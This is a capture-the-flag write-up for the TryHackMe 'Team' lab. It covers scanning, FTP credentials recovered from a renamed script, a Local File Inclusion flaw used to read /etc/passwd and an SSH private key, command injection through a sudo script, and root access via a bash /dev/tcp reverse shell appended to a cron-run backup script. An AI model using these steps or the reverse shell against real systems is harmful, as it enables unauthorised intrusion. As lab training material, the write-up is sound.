# Team — TryHackMe

**Difficulty:** Easy  
**Category:** Linux / Web / Network  
**Date:** 06/06/2026  
**Status:** ✅ Completed

---

## 📋 Table of Contents

- [Reconnaissance](#reconnaissance)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)

---

## 🔍 Reconnaissance

> Goal: identify the attack surface of the machine.

```bash
nmap -sC -sV -oN scan.txt <THM_IP_MACHINE>
```

**Open ports found:**

| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | vsftpd 3.0.5 |
| 22 | SSH | OpenSSH 8.2p1 |
| 80 | HTTP | Apache 2.4.41 |

**Initial observations:**
- FTP anonymous login disabled
- Web server returning Apache default page — real content likely behind a virtual host
- Apache page title hinted at adding a hostname to `/etc/hosts`

---

## 📡 Enumeration

> Goal: extract as much information as possible from the discovered services.

### Virtual Host Discovery

The Apache default page hinted at a hostname. Added `team.thm` to `/etc/hosts`:

```bash
echo "10.<THM_IP_MACHINE> team.thm" | sudo tee -a /etc/hosts
```

### Web — Directory Enumeration

```bash
gobuster dir -u http://team.thm -w /usr/share/wordlists/dirb/common.txt
```

**Relevant findings:**

| Path | Status |
|------|--------|
| `/robots.txt` | 200 — contained "dale" |
| `/scripts/` | 403 — directory exists |

Second gobuster pass on `/scripts/` with extensions:

```bash
gobuster dir -u http://team.thm/scripts/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,sh
```

Found: `script.txt` — a bash FTP script with a note:

> *"had to change the extension of the old script in this folder, as it has creds in"*

Accessed `script.old` directly:

```
http://team.thm/scripts/script.old
```

**FTP credentials extracted:**

- **Username:** `ftpuser`
- **Password:** `T3@m$h@r3`

### FTP Enumeration

```bash
ftp <THM_IP_MACHINE>
# Name: ftpuser
# Password: T3@m$h@r3
passive
ls -la
```

File found: `/workshare/New_site.txt`

```bash
get New_site.txt
```

Contents revealed:
- New PHP site running at `.dev` subdomain → `dev.team.thm`
- `id_rsa` was copied to a config file

Added second virtual host:

```bash
echo "<THM_IP_MACHINE> dev.team.thm" | sudo tee -a /etc/hosts
```

### LFI Discovery

Navigating to `http://dev.team.thm` revealed a link:

```
http://dev.team.thm/script.php?page=teamshare.php
```

The `?page=` parameter was vulnerable to **Local File Inclusion (LFI)**.

Confirmed with:

```
http://dev.team.thm/script.php?page=/etc/passwd
```

Users with shell access identified: `dale`, `gyles`

**SSH private key extracted via LFI:**

```
http://dev.team.thm/script.php?page=/etc/ssh/sshd_config
```

The `sshd_config` file contained Dale's `id_rsa` key embedded in comments.

---

## 💥 Exploitation

> Goal: gain initial access to the machine.

**Vulnerability found:** Local File Inclusion (LFI) in `script.php` exposing SSH private key

**Tools used:** Browser, curl, FTP, SSH

### Step 1 — Extract and save the private key

```bash
curl "http://dev.team.thm/script.php?page=/etc/ssh/sshd_config" | grep -A 200 "BEGIN" | grep -B 200 "END" | sed 's/^#//' > ~/dale_rsa
chmod 600 ~/dale_rsa
```

### Step 2 — SSH as dale

```bash
ssh -i ~/dale_rsa dale@<THM_IP_MACHINE>
```

**Result:** Shell obtained as `dale` ✅

---

## ⬆️ Privilege Escalation

> Goal: escalate privileges to root/Administrator.

### Stage 1 — dale → gyles

```bash
sudo -l
```

Output:
```
(gyles) NOPASSWD: /home/gyles/admin_checks
```

Inspected the script:

```bash
cat /home/gyles/admin_checks
```

The script reads user input and executes it directly:

```bash
read -p "Enter 'date' to timestamp the file: " error
$error 2>/dev/null
```

**Escalation vector:** command injection via unsanitised input executed as a variable.

```bash
sudo -u gyles /home/gyles/admin_checks
# Enter name: (anything)
# Enter 'date': /bin/bash
```

**Result:** Shell obtained as `gyles` ✅

`gyles` group memberships: `lxd`, `editors`, `admin`

### Stage 2 — gyles → root

The `admin` group owned `/usr/local/bin/main_backup.sh` with write permissions:

```bash
ls -la /usr/local/bin/
# -rwxrwxr-x 1 root admin 65 Jan 17 2021 main_backup.sh
```

Injected reverse shell:

```bash
echo "bash -i >& /dev/tcp/<KALI_IP>/5555 0>&1" >> /usr/local/bin/main_backup.sh
```

Listener on Kali:

```bash
nc -lvnp 5555
```

Waited for cron to execute the script as root (~1 minute).

**Result:** Shell obtained as `root` ✅

---

## 🚩 Flags

| Flag | Location | Value |
|------|----------|-------|
| user.txt | /home/dale/user.txt | `THM{6Y0TXHz7c2d}` |
| root.txt | /root/root.txt | `THM{fhqbznavfonq}` |

---

## 📚 Lessons Learned

1. **Apache default pages can hint at virtual hosts** — always check the full page title and source for hostname clues
2. **Old files with changed extensions are still accessible** — backup and renamed files (`script.old`, `script.bak`) often contain sensitive data
3. **LFI can expose more than web files** — system config files like `sshd_config` may contain embedded credentials or keys
4. **Unsanitised input executed as a shell variable is command injection** — `$variable` execution without validation is a critical flaw
5. **Group memberships are a key privesc signal** — always check `id` after lateral movement; `admin`, `lxd`, and `docker` groups are high-value targets

---

## 🛠️ Tools Used

- `nmap`
- `gobuster`
- `ftp`
- `curl`
- `ssh`
- `netcat (nc)`
- Browser (LFI enumeration)

---

*Writeup by [GabrielMachado0](https://github.com/GabrielMachado0)*
